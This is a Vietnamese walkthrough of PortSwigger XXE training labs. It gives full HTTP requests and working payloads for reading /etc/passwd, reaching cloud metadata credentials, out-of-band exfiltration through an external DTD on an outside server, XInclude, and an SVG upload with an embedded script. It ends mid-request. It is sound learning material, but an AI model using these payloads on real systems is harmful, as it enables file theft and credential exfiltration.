# XML external entity (XXE) injection

## **Lab: Exploiting XXE using external entities to retrieve files**

[Lab: Exploiting XXE using external entities to retrieve files | Web Security Academy](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

- Thực hiện chọn một sản phẩm. Điều hướng đến chức năng `Check stock`
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` .
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a9c00e203ff709f80153570000800f7.web-security-academy.net
        Cookie: session=nyvNNctbLdF5J5jqTcz9KTjlOYZkL0KE
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a9c00e203ff709f80153570000800f7.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 110
        Origin: https://0a9c00e203ff709f80153570000800f7.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>aaaa</productId><storeId>1</storeId></stockCheck>
        ```
        
- Thực hiện thay đổi param `productId` thành `aaaa` . Quan sát response trả về là thông báo lỗi kèm theo cụm `aaaa` ⇒ có thể thông báo lỗi sẽ chứa giá trị của `productId`
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a9c00e203ff709f80153570000800f7.web-security-academy.net
        Cookie: session=nyvNNctbLdF5J5jqTcz9KTjlOYZkL0KE
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a9c00e203ff709f80153570000800f7.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 110
        Origin: https://0a9c00e203ff709f80153570000800f7.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>aaaa</productId><storeId>1</storeId></stockCheck>
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%201.png)
        
- Thực hiện đổi giá trị của `stockId` thành việc gọi file `/etc/passwd` ⇒ có thể response lỗi sẽ render nội dung file:
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a9c00e203ff709f80153570000800f7.web-security-academy.net
        Cookie: session=nyvNNctbLdF5J5jqTcz9KTjlOYZkL0KE
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a9c00e203ff709f80153570000800f7.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 172
        Origin: https://0a9c00e203ff709f80153570000800f7.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]><stockCheck><productId>&ext;</productId><storeId>1</storeId></stockCheck>
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%202.png)
        
- Quan sát thấy nội dung file trả về. Hoàn thành giải lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%203.png)
    

## **Lab: Exploiting XXE to perform SSRF attacks**

[Lab: Exploiting XXE to perform SSRF attacks | Web Security Academy](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)

- Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng `Check stock`
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%204.png)
    

- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` .
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a550055041d87b581a89829001e00c4.web-security-academy.net
        Cookie: session=i6DRFwT71yiySstluE5qLPGn5lOc5URy
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a550055041d87b581a89829001e00c4.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 107
        Origin: https://0a550055041d87b581a89829001e00c4.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
        ```
        
- Thực hiện thay đổi param `productId` và nhận thấy thông báo lỗi trả về chứa cả giá trị của `productId`
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a550055041d87b581a89829001e00c4.web-security-academy.net
        Cookie: session=i6DRFwT71yiySstluE5qLPGn5lOc5URy
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a550055041d87b581a89829001e00c4.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 110
        Origin: https://0a550055041d87b581a89829001e00c4.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>aaaa</productId><storeId>1</storeId></stockCheck>
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%205.png)
        
- Vì đề cho url dịch vụ cloud nên chúng ta có thể thử request đến dịch vụ này bằng payload sau thay vào param `productId`
    - Payload
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%206.png)
        
- Thực hiện tiếp tục nối path, chúng ta fuzz ra được path sau chứa secret key
    - Payload
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
        ```
        
    - Respone
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%207.png)
        
- Hoàn thành giải lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%208.png)
    

## **Lab: Blind XXE with out-of-band interaction**

[Lab: Blind XXE with out-of-band interaction | Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

- Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng `Check stock`
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%209.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` . Thực hiện khai báo thêm một DTD entity như sau:
    - DTD entity
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://6z6ivbh3ozaxz791zwpao4zqyh48s0ko9.oastify.com"> ]>
        ```
        
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0afd00d904f613df86cdc07b00f60011.web-security-academy.net
        Cookie: session=FCDispgQzHaeDq8cjitnvEGAwijqfX9B
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0afd00d904f613df86cdc07b00f60011.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 205
        Origin: https://0afd00d904f613df86cdc07b00f60011.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://6z6ivbh3ozaxz791zwpao4zqyh48s0ko9.oastify.com"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
        ```
        
- Thực hiện gửi request trên đi, quan sát trong Burp collab, nhận thấy trigger thành công dns lookup và http request
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2010.png)
    
- Hoàn thành giải lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2011.png)
    

## **Lab: Blind XXE with out-of-band interaction via XML parameter entities**

[Lab: Blind XXE with out-of-band interaction via XML parameter entities | Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

- Thực hiện chọn một sản phẩm. Điều hướng đến chức năng `Check stock`.
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2012.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` . Tại đây, quan sát thấy rằng phía be đã chặn request chứa dtd entity thông thường
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a2d006204fdef6c80f27b51004d0095.web-security-academy.net
        Cookie: session=c8JMuwr8zBjsTZlAd02sewRENMIawy6H
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a2d006204fdef6c80f27b51004d0095.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 205
        Origin: https://0a2d006204fdef6c80f27b51004d0095.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://6z6ivbh3ozaxz791zwpao4zqyh48s0ko9.oastify.com"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2013.png)
        
- Tuy nhiên, chúng ta vẫn có thể dùng parameter entity như sau:
    - Payload
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://8fokbdx541qzf9p3fy5c46fsejka822qr.oastify.com"> %xxe;]>
        ```
        
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a2d006204fdef6c80f27b51004d0095.web-security-academy.net
        Cookie: session=c8JMuwr8zBjsTZlAd02sewRENMIawy6H
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a2d006204fdef6c80f27b51004d0095.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 208
        Origin: https://0a2d006204fdef6c80f27b51004d0095.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://8fokbdx541qzf9p3fy5c46fsejka822qr.oastify.com"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
        ```
        
- Thực hiện gửi request trên. Nhận thấy đã trigger thành công Burp collab. Hoàn thành giải lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2014.png)
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2015.png)
    

## **Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD**

[Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD | Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

- Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng `Check stock`
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2016.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` . Thực hiện thêm entity sau. Quan sát khi gửi request đi thì có trigger burp collab nên có thể dùng oob
    - Payload
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://x86942quxqjo8yis8ny1xv8h78dz1rwfl.oastify.com"> %xxe;]>
        ```
        
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0ac900b4040020dac916896200d700f0.web-security-academy.net
        Cookie: session=ebJRb6wybHKuLWbAXiTl5vBzjuytn9Yg
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0ac900b4040020dac916896200d700f0.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 208
        Origin: https://0ac900b4040020dac916896200d700f0.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://x86942quxqjo8yis8ny1xv8h78dz1rwfl.oastify.com"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2017.png)
        
- Để thực hiện đọc file, chúng ta có thể tạo ra một external dtd rồi gọi dtd đó. Tuy nhiên vì blind based nên chúng ta không thể thấy gì render trên màn hình.
    - External DTD dựng trên server của attacker
        - Head
            
            ```jsx
            HTTP/1.1 200 OK
            Content-Type: application/xml; charset=utf-8
            ```
            
        - Body
            
            ```jsx
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
            %eval;
            %error;
            ```
            
        - Config
            
            ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2018.png)
            
- Trong request gửi tới API `POST /product/stock` thực hiện gọi file dtd như sau:
    - Payload
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://exploit-0ab80098047d20b3c94f883701530072.exploit-server.net/exploit.dtd"> %xxe;]>
        ```
        
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0ac900b4040020dac916896200d700f0.web-security-academy.net
        Cookie: session=ebJRb6wybHKuLWbAXiTl5vBzjuytn9Yg
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0ac900b4040020dac916896200d700f0.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 234
        Origin: https://0ac900b4040020dac916896200d700f0.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://exploit-0ab80098047d20b3c94f883701530072.exploit-server.net/exploit.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
        ```
        
- Thực hiện gửi request trên, quan sát nội dung file `/etc/hostname` được trả về trong request tới Burp collab. Hoặc là chúng ta có thể dùng exploit server và nhận ở đó cũng được
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2019.png)
        
- Hoàn thành giải lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2020.png)
    

## **Lab: Exploiting blind XXE to retrieve data via error messages**

[Lab: Exploiting blind XXE to retrieve data via error messages | Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

- Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng `Check stock`
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2021.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` . Tại đây, thực hiện truyền payload sau. Nhận thấy trigger thành công đến Burp collab ⇒ có OOB. Ngoài ra có lỗi hiển thị trên response ⇒ có thể dùng error base vì oob thường khó chứa ký tự đặc biệt nếu không encode
    - Payload
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://n6uz2sokvghe6ogi6dwrvl675ybpzhw5l.oastify.com"> %xxe;]>
        ```
        
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a2500fe03c41f3a80c4173400b40050.web-security-academy.net
        Cookie: session=KyRTUf5iGEUZtqiiDHfXfjumqWwZNWt9
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a2500fe03c41f3a80c4173400b40050.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 208
        Origin: https://0a2500fe03c41f3a80c4173400b40050.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://n6uz2sokvghe6ogi6dwrvl675ybpzhw5l.oastify.com"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2022.png)
        
- Thực hiện tạo một external entity ở server của chúng ta như sau để trigger lỗi. Cụ thể, `% file` sẽ lấy được nội dung sau đó thì `% eval` tạo một thực thể chứa khai báo thực thể khác. Khi đó nếu gọi `% eval` xong thì `% error` được khai báo. Tiếp đến gọi `% error` thì sẽ trigger lỗi và render trong response.
    - Header
        
        ```jsx
        HTTP/1.1 200 OK
        Content-Type: application/xml; charset=utf-8
        ```
        
    - Body
        
        ```jsx
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
        %eval;
        %error;
        ```
        
    - Config
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2023.png)
        
- Thực hiện gọi đến file dtd của attack bằng cách sau:
    - Payload
        
        ```jsx
        <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://exploit-0a8800ba03941f2580531623014500c7.exploit-server.net/exploit.dtd"> %xxe;]>
        ```
        
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0a2500fe03c41f3a80c4173400b40050.web-security-academy.net
        Cookie: session=KyRTUf5iGEUZtqiiDHfXfjumqWwZNWt9
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0a2500fe03c41f3a80c4173400b40050.web-security-academy.net/product?productId=1
        Content-Type: application/xml
        Content-Length: 234
        Origin: https://0a2500fe03c41f3a80c4173400b40050.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://exploit-0a8800ba03941f2580531623014500c7.exploit-server.net/exploit.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
        ```
        
- Thực hiện gọi request trên, quan sát response trả về chứa nội dung file. Hoàn thành giải lab
    - POC
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2024.png)
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2025.png)
        

## **Lab: Exploiting XInclude to retrieve files**

[Lab: Exploiting XInclude to retrieve files | Web Security Academy](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

- Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng `Check stock`
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2026.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` . Tại đây, thực hiện thay đổi param `productId` và quan sát thấy response trả về chứa thông báo lỗi và cả giá trị chúng ta thay đổi cho param `productId`
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0ac2008b04324780dcb84a790082005b.web-security-academy.net
        Cookie: session=CutfG8nHbdI3uKdGlu7tfbZSbPo1wiGX
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0ac2008b04324780dcb84a790082005b.web-security-academy.net/product?productId=1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 24
        Origin: https://0ac2008b04324780dcb84a790082005b.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        productId=aaaa&storeId=1
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2027.png)
        
- Tuy nhiên thì ở đây, dữ liệu truyền vào có thể được đưa vào một xml file rồi parse sau đó ⇒ có xxe injection. Tuy nhiên, chúng ta không thể kiểm soát bằng cách khai báo thực thể (vì trường chúng ta đẩy vào một param của file nên nếu khai báo như vậy sẽ bị lỗi). Tuy vậy, vẫn còn một cách đó là dùng `XInclude` như sau:
    - Payload
        
        ```jsx
        <foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include parse="text" href="file:///etc/passwd"/></foo>
        ```
        
    - Request
        
        ```jsx
        POST /product/stock HTTP/2
        Host: 0ac2008b04324780dcb84a790082005b.web-security-academy.net
        Cookie: session=CutfG8nHbdI3uKdGlu7tfbZSbPo1wiGX
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0ac2008b04324780dcb84a790082005b.web-security-academy.net/product?productId=1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 196
        Origin: https://0ac2008b04324780dcb84a790082005b.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        productId=%3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%0d%0a%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e&storeId=1
        ```
        

- Thực hiện gửi request trên, quan sát response trả về là nội dung file
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2028.png)
    
- Hoàn thành giải lab
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2029.png)
    

## **Lab: Exploiting XXE via image file upload**

[Lab: Exploiting XXE via image file upload | Web Security Academy](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

- Thực hiện chọn một sản phẩm bất kỳ. Điều hướng đến chức năng post comment. Tại đây, thực hiện upload ảnh.
    
    ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2030.png)
    
- Ở đây, chúng ta có thể upload ảnh svg (có dạng xml) sau đó ảnh vẫn có thể hiển thị ⇒ có thể có trình parse xml. Chúng ta bổ sung thêm entity trigger oob vào body ảnh thì nhận thấy có thể trigger thành công.
    - Payload
        
        ```jsx
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://hg1tcmye5ar8giqcg76l5fg1fslj9b7zw.oastify.com"> %xxe;]>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        
        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
           <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
           <script type="text/javascript">
              alert(document.domain);
           </script>
        </svg>
        ```
        
    - Request
        
        ```jsx
        POST /post/comment HTTP/2
        Host: 0ae700dd0486872281cafd4600ab00a1.web-security-academy.net
        Cookie: session=MyWWuTmNZsLQg2vLDbyN82NtgKz8mbBR
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Length: 1425
        Origin: https://0ae700dd0486872281cafd4600ab00a1.web-security-academy.net
        Referer: https://0ae700dd0486872281cafd4600ab00a1.web-security-academy.net/post?postId=5
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="csrf"
        
        qAIevmCpcVt7Au1s3RSbN51kVv6ooAlO
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="postId"
        
        5
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="comment"
        
        hehe
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="name"
        
        hehe
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="avatar"; filename="SVG_XSS_green_triangle.svg"
        Content-Type: image/svg+xml
        
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://hg1tcmye5ar8giqcg76l5fg1fslj9b7zw.oastify.com"> %xxe;]>
        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
           <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
           <script type="text/javascript">
              alert(document.domain);
           </script>
        </svg>
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="email"
        
        a@ginandjuice.shop
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="website"
        
        http://a.com
        ------geckoformboundary40294791d907d871ac79c3cebe3991e--
        
        ```
        
    - Response
        
        ![image.png](XML%20external%20entity%20(XXE)%20injection/image%2031.png)
        
- Thực hiện đọc file bất kỳ như sau
    - Payload
        
        ```jsx
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
        
        <svg width="200" height="60" xmlns="http://www.w3.org/2000/svg">
          <text x="10" y="40" font-family="Arial" font-size="24" fill="blue">
            &xxe;
          </text>
        </svg>
        ```
        
    - Request
        
        ```jsx
        POST /post/comment HTTP/2
        Host: 0ae700dd0486872281cafd4600ab00a1.web-security-academy.net
        Cookie: session=MyWWuTmNZsLQg2vLDbyN82NtgKz8mbBR
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: multipart/form-data; boundary=----geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Length: 1213
        Origin: https://0ae700dd0486872281cafd4600ab00a1.web-security-academy.net
        Referer: https://0ae700dd0486872281cafd4600ab00a1.web-security-academy.net/post?postId=5
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="csrf"
        
        qAIevmCpcVt7Au1s3RSbN51kVv6ooAlO
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="postId"
        
        1
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="comment"
        
        hehe
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="name"
        
        hehe
        ------geckoformboundary40294791d907d871ac79c3cebe3991e
        Content-Disposition: form-data; name="avatar"; filename="SVG_XSS_green_triangle.svg"
        Content-Type: image/svg+xml
        
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
        
        <svg width="200" height="60" xmlns="http://www.w3.org/2000/svg">
          <text x="10" y="40" font-family="Arial" font-size="24" fill="blue">
            &xxe;
          </text>
        </svg>
        
